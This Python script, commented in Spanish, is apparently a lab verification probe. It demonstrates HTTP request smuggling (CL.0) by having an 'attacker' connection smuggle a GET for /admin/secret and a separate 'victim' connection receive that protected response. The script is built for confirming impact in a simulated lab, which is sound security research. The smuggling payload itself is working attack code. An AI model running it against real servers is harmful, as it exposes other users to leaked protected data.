#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
v0.92.0 IMPACT CORRELATION
==========================
Etapa de IMPACT del roadmap: dado un desync reproducido
(la firma del REPRODUCTION ENGINE), responde UNA
pregunta: el efecto de estado hace dano a un usuario
DISTINTO del atacante (contaminacion de respuesta
cross-user)?

Mecanica v0.92: el atacante (conexion A) hace POST CL.0
con un request smuggleado y CIERRA tras leer su propia
respuesta; el smuggle ya viajo al origin y su respuesta
queda PENDIENTE en la conn del pool. La victima
(conexion V, TCP DISTINTO) hereda la conn: su primer
request recibe la respuesta del smuggle del atacante.

Oraculo observable (nada inferido): QUE respuesta recibe
la victima. Clasificacion por atribucion:
  ECHO <vtok>       -> ALIGNED (su propio eco: sin
                       impacto)
  SECRET-IMPACT-*   -> SMUGGLED-PROTECTED (la victima
                       recibio la respuesta de un recurso
                       protegido que jamas pidio)
  ECHO <otro-tok>   -> MISPAIRED-BENIGN (eco del token
                       del ATACANTE: mispairing cruzado
                       pero contenido benigno)
  OK                -> MISPAIRED-BENIGN (la respuesta del
                       POST del atacante llego a la
                       victima)

Escalera determinista (nunca se salta, cero-FP):
  BENIGN -> IMPACT-CANDIDATE (mispairing benigno, o swap
  protegido 1/2: probable, NO reportable)
  -> SECURITY-IMPACT-DEMO (swap protegido 2/2 rondas Y
     control limpio: la victima recibe a demanda la
     respuesta protegida del smuggle del atacante)
  (+ BENIGN-EDGE / UNREACHABLE / UNSTABLE / UNKNOWN)

Auto-control por atribucion: la fase CONTROL (victima
limpia antes de envenenar) valida que el apareamiento
funciona con la cola alineada. Sin control no hay claim.

Presupuesto: 1 control + 2 rondas x (1 POST atacante +
1 GET victima) = 5 requests max. Read-only: los smuggles
son GETs al propio lab; el recurso protegido
(/admin/secret) es dato SIMULADO del lab, jamas un
recurso de terceros.

Aprendizajes v0.87-91: bytes crudos jamas repr(b'..');
buffers PERSISTENTES por conexion; el obuf viaja CON la
conn del pool; conn muerta = error honesto, no crash;
nada en paralelo.
"""

import argparse
import secrets
import socket
import sys
import time

MODULE_VERSION = "0.92.0"
BUDGET = 6            # 5 usados + holgura declarada
ROUNDS = 2            # swap protegido requiere 2/2
SETTLE_S = 0.25


# ------------------------------------------------------------------
# infraestructura minima (mismo patron que los probes v0.87-91)
# ------------------------------------------------------------------
def _connect(host, port, timeout):
    return socket.create_connection((host, port),
                                    timeout=timeout)


class H1Reader:
    """Lector H1 crudo: una respuesta por llamada, buffer
    PERSISTENTE por conexion (leccion v0.88)."""

    def __init__(self, s):
        self.s = s
        self.buf = b""

    def _recv(self):
        try:
            d = self.s.recv(65535)
        except (socket.timeout, OSError):
            return False
        if not d:
            return False
        self.buf += d
        return True

    def read_resp(self):
        """(status_line, body) o (None, None)."""
        while True:
            i = self.buf.find(b"\r\n\r\n")
            if i >= 0:
                break
            if not self._recv():
                return None, None
        head = self.buf[:i]
        lines = head.split(b"\r\n")
        status = (lines[0].decode("latin-1", "replace")
                  if lines else "")
        cl = 0
        for ln in lines[1:]:
            if b":" in ln:
                k, v = ln.split(b":", 1)
                if (k.strip().lower()
                        == b"content-length"):
                    try:
                        cl = int(v.strip() or b"0")
                    except ValueError:
                        cl = 0
        while len(self.buf) < i + 4 + cl:
            if not self._recv():
                return None, None
        body = self.buf[i + 4:i + 4 + cl]
        self.buf = self.buf[i + 4 + cl:]
        return status, body.decode("latin-1", "replace")


def _classify(body, vtok):
    """Atribucion de la respuesta de la victima."""
    if body is None:
        return "NO-RESPONSE"
    if body == "ECHO %s" % vtok:
        return "ALIGNED"
    if body.startswith("SECRET-IMPACT"):
        return "SMUGGLED-PROTECTED"
    if body.startswith("ECHO "):
        return "MISPAIRED-BENIGN"
    if body == "OK":
        return "MISPAIRED-BENIGN"
    return "UNEXPECTED"


def _victim_get(host, port, timeout, tok):
    """GET benigno en conexion FRESCA: simula un usuario
    distinto del atacante. Devuelve (status, body, err)."""
    s = None
    try:
        s = _connect(host, port, timeout)
        s.settimeout(timeout)
        rd = H1Reader(s)
        req = ("GET /?itok=%s HTTP/1.1\r\n"
               "Host: impact\r\n\r\n" % tok).encode()
        s.sendall(req)
        st, body = rd.read_resp()
        if st is None:
            return None, None, "sin respuesta"
        return st, body, None
    except (socket.timeout, OSError) as e:
        return None, None, repr(e)
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass


def _attacker_poison(host, port, timeout, smuggle_path):
    """POST CL.0 con smuggle en conexion FRESCA; lee SU
    propia respuesta y CIERRA (la respuesta del smuggle
    queda pendiente en la conn del pool). Devuelve
    (status, body, err)."""
    s = None
    try:
        s = _connect(host, port, timeout)
        s.settimeout(timeout)
        rd = H1Reader(s)
        post = ("POST / HTTP/1.1\r\nHost: impact\r\n"
                "Content-Length: 0\r\n\r\n").encode()
        smug = ("GET %s HTTP/1.1\r\nHost: impact\r\n"
                "\r\n" % smuggle_path).encode()
        s.sendall(post + smug)
        st, body = rd.read_resp()
        if st is None:
            return None, None, "sin respuesta al POST"
        return st, body, None
    except (socket.timeout, OSError) as e:
        return None, None, repr(e)
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass


# ------------------------------------------------------------------
# auditoria
# ------------------------------------------------------------------
def impact_audit(cfg):
    host = cfg.get("host", "127.0.0.1")
    port = int(cfg.get("port", 19603))
    timeout = float(cfg.get("timeout", 5.0))
    smuggle = cfg.get("smuggle_path", "/admin/secret")

    informe = {
        "module": "impact_correlation",
        "version": MODULE_VERSION,
        "verdict": "UNKNOWN",
        "reasons": [],
        "requests": 0,
        "evidence": {"control": None, "rounds": []},
    }

    # ---- fase CONTROL: cola alineada (sin veneno) ----
    ctok = secrets.token_hex(4)
    st, body, err = _victim_get(host, port, timeout,
                                "ctl-%s" % ctok)
    informe["requests"] += 1
    informe["evidence"]["control"] = {
        "tok": "ctl-%s" % ctok, "status": st,
        "body": body, "err": err}
    ctrl_class = _classify(body, "ctl-%s" % ctok)
    if ctrl_class != "ALIGNED":
        if err and ("Connection refused" in err
                    or "timed out" in err):
            informe["verdict"] = "UNREACHABLE"
        elif ctrl_class == "NO-RESPONSE":
            informe["verdict"] = "UNSTABLE"
        informe["reasons"].append(
            "control NO alineado (%s%s): sin control no "
            "hay claim" % (ctrl_class,
                           ": " + err if err else ""))
        return informe

    # ---- fases de ataque: 2 rondas (swap 2/2 exige
    # reproduccion; un disparo unico NO escala) ----
    swp = 0
    mis = 0
    for r in range(ROUNDS):
        # atacante: envenena y cierra
        ast, abody, aerr = _attacker_poison(
            host, port, timeout, smuggle)
        informe["requests"] += 1
        if ast is None:
            if aerr and "timed out" in aerr:
                informe["verdict"] = "UNSTABLE"
                informe["reasons"].append(
                    "ronda %d: atacante sin respuesta "
                    "(blanco muerto a mitad de fase)" % (
                        r + 1))
                return informe
            informe["verdict"] = "BENIGN-EDGE"
            informe["reasons"].append(
                "ronda %d: RST del edge al smuggle "
                "(frontera benigna)" % (r + 1))
            return informe
        # settle acotado: el edge debe encolar el
        # smuggle en la conn del pool ANTES de que
        # llegue la victima; sin esto, bajo carga
        # (corpus completo) la victima puede golpear
        # antes y recibir conn fresca -> ALIGNED
        # espurio (flake RC-000256). Determinismo del
        # lab, no semantica del oraculo.
        time.sleep(SETTLE_S)
        # victima: usuario DISTINTO, conexion distinta
        vtok = "vic-%d-%s" % (r + 1, secrets.token_hex(4))
        vst, vbody, verr = _victim_get(
            host, port, timeout, vtok)
        informe["requests"] += 1
        cls = _classify(vbody, vtok)
        informe["evidence"]["rounds"].append({
            "round": r + 1, "vtok": vtok,
            "status": vst, "body": vbody,
            "class": cls})
        if cls == "SMUGGLED-PROTECTED":
            swp += 1
        elif cls == "MISPAIRED-BENIGN":
            mis += 1

    # ---- presupuesto duro ----
    if informe["requests"] > BUDGET:
        informe["verdict"] = "UNSTABLE"
        informe["reasons"].append(
            "presupuesto excedido: %d > %d" % (
                informe["requests"], BUDGET))
        return informe

    # ---- veredicto (escalera conservadora) ----
    if swp == ROUNDS:
        informe["verdict"] = "SECURITY-IMPACT-DEMO"
        informe["reasons"].append(
            "swap protegido 2/2 con control limpio: la "
            "victima recibe a demanda la respuesta del "
            "recurso protegido smuggleado por el atacante "
            "(contaminacion cross-user)")
    elif swp > 0 or mis > 0:
        informe["verdict"] = "IMPACT-CANDIDATE"
        if swp > 0:
            informe["reasons"].append(
                "swap protegido %d/%d: impacto probable "
                "pero NO reproducido (cero-FP: no "
                "reportable)" % (swp, ROUNDS))
        else:
            informe["reasons"].append(
                "mispairing cruzado benigno %d/%d: "
                "atribucion alterada sin contenido "
                "protegido (NO reportable)" % (
                    mis, ROUNDS))
    else:
        informe["verdict"] = "BENIGN"
        informe["reasons"].append(
            "todas las rondas ALIGNED: la victima siempre "
            "recibe su propio eco")
    return informe


# ------------------------------------------------------------------
# CLI
# ------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="IMPACT CORRELATION v0.92")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=19603)
    ap.add_argument("--smuggle-path",
                    default="/admin/secret")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    inf = impact_audit({
        "host": a.host, "port": a.port,
        "smuggle_path": a.smuggle_path})
    if a.json:
        import json
        print(json.dumps(inf, indent=2, default=str))
    else:
        print("veredicto:", inf["verdict"])
        print("reqs:", inf["requests"])
        for r in inf["reasons"]:
            print("  -", r)
        for rd in inf["evidence"]["rounds"]:
            print("  ronda %s: %s -> %r" % (
                rd["round"], rd["class"], rd["body"]))
    return 0 if inf["verdict"] not in (
        "UNKNOWN", "UNSTABLE", "UNREACHABLE") else 1


if __name__ == "__main__":
    sys.exit(main())
